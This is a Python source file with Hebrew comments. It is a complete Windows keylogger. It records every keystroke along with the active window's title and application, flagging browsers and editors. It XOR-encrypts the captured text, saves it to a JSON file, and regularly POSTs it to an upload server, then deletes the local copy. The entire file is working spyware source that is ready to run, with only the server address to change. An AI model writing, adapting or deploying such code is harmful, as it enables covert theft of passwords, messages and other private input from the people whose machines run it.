from pynput import keyboard
import json
import time
import os
import threading
import requests
from datetime import datetime
import win32gui
import win32process
import psutil
from encryptor import xor_encrypt

class KeyLogger:
    def __init__(self):
        self.window_buffers = {}  # מילון לשמירת הקלדות לפי חלון
        self.current_window = None
        self.stop_logging = False
        self.last_save = time.time()
        self.FILENAME = "keystrokes.json"
        self.SERVER_URL = "http://127.0.0.1:5000/api/upload"

    def get_window_key(self, window_info):
        """יוצר מפתח ייחודי לחלון"""
        return f"{window_info['application']}:{window_info['title']}"

    def add_to_buffer(self, key_char, window_info):
        """מוסיף תו לבאפר של החלון המתאים"""
        window_key = self.get_window_key(window_info)
        
        if window_key not in self.window_buffers:
            self.window_buffers[window_key] = {
                "window_info": window_info,
                "keys": [],
                "last_update": time.time()
            }
        
        self.window_buffers[window_key]["keys"].append(key_char)
        self.window_buffers[window_key]["last_update"] = time.time()

    def save_to_json(self, force_all=False):
        """שומר את הבאפרים לקובץ"""
        current_time = time.time()
        file_data = []
        windows_to_clear = []

        try:
            # טוען נתונים קיימים מהקובץ
            if os.path.exists(self.FILENAME) and os.path.getsize(self.FILENAME) > 0:
                with open(self.FILENAME, "r", encoding="utf-8") as f:
                    file_data = json.load(f)

            # עובר על כל הבאפרים
            for window_key, buffer in self.window_buffers.items():
                # שומר רק אם יש מספיק תווים או עבר מספיק זמן
                if force_all or len(buffer["keys"]) >= 20 or \
                   (current_time - buffer["last_update"]) >= 60:
                    
                    if buffer["keys"]:  # שומר רק אם יש תוכן
                        data = {
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "window": buffer["window_info"],
                            "keystrokes": "".join(buffer["keys"])
                        }
                        encrypted_data = xor_encrypt(json.dumps(data))
                        file_data.append({"encrypted": encrypted_data})
                        windows_to_clear.append(window_key)

            # שומר לקובץ
            if file_data:
                with open(self.FILENAME, "w", encoding="utf-8") as f:
                    json.dump(file_data, f, indent=4, ensure_ascii=False)

            # מנקה באפרים שנשמרו
            if force_all:
                self.window_buffers.clear()
            else:
                for window_key in windows_to_clear:
                    self.window_buffers[window_key]["keys"] = []

            # שולח לשרת
            self.send_to_server()

        except Exception as e:
            print(f"[ERROR] Failed to save: {e}")

    def on_press(self, key):
        try:
            window_info = self.get_active_window()
            key_char = self.format_key(key)
            
            if key_char:
                self.add_to_buffer(key_char, window_info)

            if key == keyboard.Key.esc:
                self.stop_logging = True
                self.save_to_json(force_all=True)
                return False

        except Exception as e:
            print(f"[ERROR] Failed to process key: {e}")

    def start(self):
        print("[LOG] Starting keylogger...")
        
        # מתחיל thread לשמירה תקופתית
        save_thread = threading.Thread(target=self.periodic_save, daemon=True)
        save_thread.start()
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def get_active_window(self):
        """מחזיר מידע מורחב על החלון הפעיל"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            window_title = win32gui.GetWindowText(hwnd)
            
            window_info = {
                "title": window_title,
                "application": process.name(),
                "type": "Unknown"
            }

            # זיהוי סוג החלון
            if "chrome" in process.name().lower():
                window_info["type"] = "Browser"
                window_info["browser"] = "Chrome"
            elif "firefox" in process.name().lower():
                window_info["type"] = "Browser"
                window_info["browser"] = "Firefox"
            elif "code" in process.name().lower():
                window_info["type"] = "Editor"
            elif "notepad" in process.name().lower():
                window_info["type"] = "Editor"
                
            return window_info
        except:
            return {"title": "Unknown Window", "application": "Unknown", "type": "Unknown"}

    def format_key(self, key):
        """מפרמט מקשים מיוחדים"""
        try:
            if hasattr(key, 'char'):
                return key.char if key.char else ""
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t",
                keyboard.Key.backspace: "[Backspace]",
                keyboard.Key.delete: "[Delete]",
                keyboard.Key.shift: "[Shift]",
                keyboard.Key.ctrl: "[Ctrl]",
                keyboard.Key.alt: "[Alt]"
            }
            return special_keys.get(key, f"[{str(key)}]")
        except:
            return ""

    def send_to_server(self):
        """שולח את הנתונים לשרת"""
        try:
            if not os.path.exists(self.FILENAME):
                return
                
            with open(self.FILENAME, "r", encoding="utf-8") as f:
                file_data = json.load(f)
                
            for entry in file_data:
                payload = {
                    "machine": "User-PC",
                    "data": entry["encrypted"]
                }
                response = requests.post(self.SERVER_URL, json=payload)
                print(f"[LOG] Server response: {response.status_code}")
                
            if os.path.exists(self.FILENAME):
                os.remove(self.FILENAME)
                print("[LOG] Data file removed after sending")
        except Exception as e:
            print(f"[ERROR] Failed to send data: {e}")

    def periodic_save(self):
        while not self.stop_logging:
            time.sleep(60)
            self.save_to_json()

if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()

